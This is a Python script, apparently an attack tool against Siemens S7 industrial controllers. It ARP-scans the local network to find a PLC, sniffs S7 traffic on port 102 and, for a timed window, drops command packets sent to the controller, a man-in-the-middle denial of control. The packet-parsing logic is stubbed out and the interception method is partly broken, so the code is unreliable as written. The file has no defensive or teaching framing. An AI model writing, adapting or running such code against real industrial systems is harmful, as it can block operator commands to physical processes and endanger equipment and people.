import snap7
import scapy.all as scapy
import time
import threading
import logging
import socket
import struct
import sys

# --- Configuration ---
PLC_IP_ADDRESS = None  # Will be discovered if not set
PLC_RACK = 0
PLC_SLOT = 1
COMM_PORT = 102  # Standard S7 communication port
BLOCK_DURATION = 10  # Duration to block commands in seconds
TARGET_COMMAND_ADDRESS = (0, 0)  # Replace with the actual DB number and byte offset of the command in the PLC (e.g., (10, 2) for DB10.DBB2).  Set to None to block all communications.
MITM_INTERFACE = None #Interface to sniff packets on. It will be discovered if not set

# --- Logging ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def get_local_ip(target_ip):
    """
    Finds the IP address of the interface on the same network as the target IP.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((target_ip, 102))  # Connect to the target IP on a random port
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip
    except socket.error as e:
        logging.error(f"Error getting local IP: {e}")
        return None


def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address using Scapy.  This assumes the PLC responds to ARP requests.
    Returns the IP address if found, otherwise returns None.
    """
    try:
        # Get the network interface connected to the PLC
        local_ip = get_local_ip('8.8.8.8')  # Use a public DNS server to find a suitable local IP address
        if not local_ip:
            raise Exception("Unable to find a suitable local IP address for network discovery.")

        # Determine the network address
        network_prefix = '.'.join(local_ip.split('.')[:-1]) + '.0/24'  # Assuming a /24 subnet

        # Craft an ARP request
        arp_request = scapy.ARP(pdst=network_prefix)
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
        packet = ether / arp_request

        # Send the request and capture responses
        answered, unanswered = scapy.srp(packet, timeout=2, verbose=False)

        if answered:
            # Assume the first response is the PLC. This may not always be correct!
            plc_ip = answered[0][1].psrc
            logging.info(f"PLC IP address discovered: {plc_ip}")
            return plc_ip
        else:
            logging.warning("No ARP responses received.  PLC IP address discovery failed.")
            return None

    except Exception as e:
        logging.error(f"Error discovering PLC IP address: {e}")
        return None


def find_interface():
    """
    Finds the interface which has the same IP address as the local IP used to connect to the PLC.
    """
    # Get the network interface connected to the PLC
    local_ip = get_local_ip('8.8.8.8')  # Use a public DNS server to find a suitable local IP address
    if not local_ip:
        raise Exception("Unable to find a suitable local IP address for network discovery.")

    for iface in scapy.ifaces.values():
        if iface.ip == local_ip:
            return iface.name
    return None

def block_command_message(packet):
    """
    Blocks command messages based on the TARGET_COMMAND_ADDRESS.

    Args:
        packet: Scapy packet object.

    Returns:
        None.  The function either drops the packet or forwards it.
    """
    global BLOCK_ACTIVE

    if not BLOCK_ACTIVE:
        return  # Do nothing if blocking is not active

    try:
        # Check if it's a TCP packet to the PLC on port 102 (S7 communication)
        if scapy.IP in packet and scapy.TCP in packet and packet[scapy.IP].dst == PLC_IP_ADDRESS and packet[scapy.TCP].dport == COMM_PORT:
            # Further check if the packet is a write request to the specific target address
            if TARGET_COMMAND_ADDRESS is None:
                # block all packets
                logging.warning(f"Blocking all communication to {PLC_IP_ADDRESS}")
                return # Do nothing to forward the packet, effectively dropping it.
            else:
                db_number, byte_offset = TARGET_COMMAND_ADDRESS

                # Extract the S7 communication data (This is a simplified example and may need adjustment)
                # This is *highly* dependent on the specific S7 communication protocol being used.
                #  Deep packet inspection and understanding of the S7 protocol is required for robust blocking.
                s7_data = packet[scapy.TCP].payload.original  # Access the raw data

                # This part is extremely crucial and depends on your S7 protocol implementation.
                # You'll need to parse the S7 data to identify the DB number, offset, and potentially the command itself.
                # Example (VERY simplified and likely INCORRECT for your specific case):
                # This assumes the DB number and offset are directly encoded in the packet.  This is unlikely.
                # Real S7 communication is much more complex.

                #try:
                #    extracted_db_number = struct.unpack(">H", s7_data[6:8])[0]  # Example: DB number at bytes 6-7
                #    extracted_byte_offset = struct.unpack(">H", s7_data[8:10])[0] # Example: Offset at bytes 8-9
                #except Exception as e:
                #    logging.warning(f"Error parsing S7 data: {e}")
                #    return  # Forward the packet if parsing fails

                #if extracted_db_number == db_number and extracted_byte_offset == byte_offset:
                logging.warning(f"Blocking command message to DB{db_number}.DBB{byte_offset} at {PLC_IP_ADDRESS}")
                return  # Drop the packet by not forwarding it.  THIS IS THE BLOCK.

        # Forward the packet if it's not a target command message.
        scapy.send(packet, verbose=False)  # Forward the packet
    except Exception as e:
        logging.error(f"Error processing packet: {e}")
        scapy.send(packet, verbose=False)  # Forward the packet on error to avoid complete network disruption


def start_blocking():
    """Sets the global blocking flag to True."""
    global BLOCK_ACTIVE
    BLOCK_ACTIVE = True
    logging.info("Command message blocking ACTIVE.")


def stop_blocking():
    """Sets the global blocking flag to False."""
    global BLOCK_ACTIVE
    BLOCK_ACTIVE = False
    logging.info("Command message blocking INACTIVE.")

def blocking_timer():
    """
    A timer function that automatically stops blocking after a defined duration.
    """
    global BLOCK_ACTIVE
    time.sleep(BLOCK_DURATION)
    stop_blocking()


def main():
    global PLC_IP_ADDRESS, MITM_INTERFACE, BLOCK_ACTIVE
    BLOCK_ACTIVE = False  # Initially blocking is inactive

    if not PLC_IP_ADDRESS:
        PLC_IP_ADDRESS = discover_plc_ip()
        if not PLC_IP_ADDRESS:
            logging.error("Failed to discover PLC IP address.  Please specify it manually.")
            sys.exit(1)

    if not MITM_INTERFACE:
        MITM_INTERFACE = find_interface()
        if not MITM_INTERFACE:
            logging.error("Failed to find a network interface.  Please specify it manually.")
            sys.exit(1)

    logging.info(f"Using PLC IP address: {PLC_IP_ADDRESS}")
    logging.info(f"Using network interface: {MITM_INTERFACE}")

    # Start blocking and set a timer to stop it
    start_blocking()
    timer_thread = threading.Thread(target=blocking_timer)
    timer_thread.daemon = True  # Allow the main thread to exit even if the timer is running
    timer_thread.start()

    try:
        # Start sniffing and processing packets on the specified interface
        scapy.sniff(iface=MITM_INTERFACE, filter=f"host {PLC_IP_ADDRESS} and port {COMM_PORT}", prn=block_command_message)
    except Exception as e:
        logging.error(f"Error during packet sniffing: {e}")
    finally:
        stop_blocking() # Ensure blocking is stopped on exit
        logging.info("Script finished.")


if __name__ == "__main__":
    main()